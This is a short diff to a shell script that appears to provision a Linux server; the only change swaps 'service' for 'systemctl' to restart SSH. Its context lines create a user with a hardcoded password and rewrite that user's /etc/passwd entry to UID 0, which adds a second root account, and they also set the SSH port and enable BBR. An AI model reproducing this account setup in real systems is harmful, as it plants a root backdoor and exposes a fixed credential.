@@ -9,7 +9,7 @@ echo "Port 22"  >> /etc/ssh/sshd_config
 useradd ryan
 echo ryan:LBdj147369 |chpasswd ryan
 sed -i 's|^.*ryan.*|ryan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
-service sshd ssh restart
+systemctl restart sshd ssh
 curl ipv4.ip.sb
 echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
 echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
